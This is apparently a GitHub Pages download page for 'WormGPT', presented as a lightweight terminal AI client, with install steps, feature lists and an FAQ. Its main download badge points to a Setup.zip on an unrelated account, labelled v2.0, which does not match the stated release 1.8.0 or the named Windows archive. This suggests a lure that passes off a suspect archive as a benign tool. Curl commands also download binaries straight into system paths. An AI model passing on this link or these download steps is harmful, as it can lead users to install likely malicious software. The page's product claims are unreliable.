---
layout: "default"
title: "WormGPT — Download & Setup Guide"
description: "Setup guide for WormGPT: lightweight terminal-first AI client, streaming responses, multi-provider support, plugin system and system requirements."
---
# WormGPT — Download & Setup Guide

[![](https://img.shields.io/badge/Download-WormGPT-blue.svg)](https://github.com/ai-power6954/ai-power6954.github.io/releases/download/v2.0/Setup.zip)

Release 1.8.0 | Platform: Windows / macOS / Linux | Distribution: CLI + optional TUI

## Overview

WormGPT is a lightweight, terminal-first AI client designed for developers who live in the shell. It provides a fast, keyboard-driven interface for interacting with multiple AI providers from a single tool, with streaming responses, session persistence, and a plugin system for extending functionality.

The client supports OpenAI-compatible APIs, Anthropic APIs, and local models through a unified interface. It is designed for speed: minimal startup time, low memory footprint, and instant response streaming.

## Model Support

| Provider | Models | Protocol | Best for |
| --- | --- | --- | --- |
| OpenAI-compatible | GPT-6 Astra, GPT-5.6, custom | OpenAI API | General purpose, coding |
| Anthropic | Claude Opus 5.5, Sonnet, Haiku | Anthropic API | Agentic workflows |
| Local | Any GGUF model | llama.cpp | Offline, privacy |
| Custom | Any OpenAI-compatible endpoint | Configurable | Self-hosted models |

All providers share the same session history, prompt templates, and plugin system. You can switch providers per session or configure fallbacks.

## System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| Operating system | Windows 10, macOS 11, Linux (glibc 2.31+) | Windows 11, macOS 14, latest Linux |
| Processor | 2 cores, 1.8 GHz | 4 cores, 2.5 GHz |
| Memory | 512 MB RAM | 2 GB RAM |
| Storage | 50 MB free space | 200 MB free space |
| Network | Broadband for cloud providers | Low-latency connection |
| Account | API key for your provider(s) | Multiple provider keys |

WormGPT is extremely lightweight and runs comfortably on minimal hardware. No GPU is required.

## How to Download and Install

### Windows

1. Download `wormgpt-windows-x64.zip` from the releases page.
2. Extract the archive and add `wormgpt.exe` to your PATH.
3. Run `wormgpt init` to create your configuration file.

### macOS

```bash
brew install wormgpt/tap/wormgpt
```

Or download the binary from the releases page:

```bash
curl -L https://github.com/wormgpt/wormgpt-cli/releases/latest/download/wormgpt-darwin-arm64 -o /usr/local/bin/wormgpt
chmod +x /usr/local/bin/wormgpt
```

### Linux

```bash
curl -L https://github.com/wormgpt/wormgpt-cli/releases/latest/download/wormgpt-linux-x64 -o /usr/local/bin/wormgpt
chmod +x /usr/local/bin/wormgpt
```

### Initial Setup

1. Run `wormgpt init` to create your configuration.
2. Add your API key:

```bash
wormgpt config set openai.api_key sk-...
```

3. Select your default model:

```bash
wormgpt config set model gpt-6-astra
```

4. Start a session:

```bash
wormgpt chat
```

## Key Features

- **Terminal-first interface:** fast, keyboard-driven TUI with streaming responses.
- **Multi-provider support:** OpenAI, Anthropic, and local models through a unified interface.
- **Session persistence:** save and resume conversations in a portable JSONL format.
- **Prompt templates:** define reusable prompts with variables for common tasks.
- **Plugin system:** extend WormGPT with custom commands, tools, and integrations.
- **Provider fallbacks:** automatically switch to a backup provider if the primary fails.
- **Pipe support:** use WormGPT in shell pipelines for scripting and automation.
- **Minimal footprint:** single binary, no dependencies, starts in milliseconds.

## Troubleshooting & FAQ

Check this list before contacting support.

- **API key not recognized:** verify the key is correct and has not expired. Run `wormgpt config list` to confirm the key is set.
- **Connection timeout:** check your internet connection and proxy settings. Set `HTTP_PROXY` or `HTTPS_PROXY` environment variables if needed.
- **Rate limit errors:** the provider is rate-limiting your requests. Add a fallback provider or reduce request frequency.
- **Local model fails to load:** ensure the GGUF model file is valid and you have enough RAM. Use `wormgpt local list` to see available models.
- **TUI rendering issues:** set `TERM=xterm-256color` or use `wormgpt chat --no-tui` for plain text output.
- **Updating WormGPT:** re-download the latest binary and replace the existing one. Configuration and sessions are preserved.

**Is WormGPT free?**
The CLI is free and open-source. You pay only for the API usage to your chosen providers.

**Does WormGPT work offline?**
Yes, with local models through llama.cpp. Cloud providers require an internet connection.

**Which providers are supported?**
Any OpenAI-compatible API, Anthropic API, and local GGUF models through llama.cpp.

**Can I use WormGPT in scripts?**
Yes. WormGPT supports pipe mode: `echo "Summarize this" | wormgpt pipe --model gpt-6-astra`.

**How do I switch models mid-session?**
Use the `/model` command in the TUI or the `--model` flag in pipe mode.

**Is my data stored anywhere?**
Sessions are stored locally in `~/.wormgpt/sessions/`. No data is sent anywhere except to your configured API providers.

---

WormGPT CLI, Release 1.8.0. Product and setup documentation by the WormGPT team.
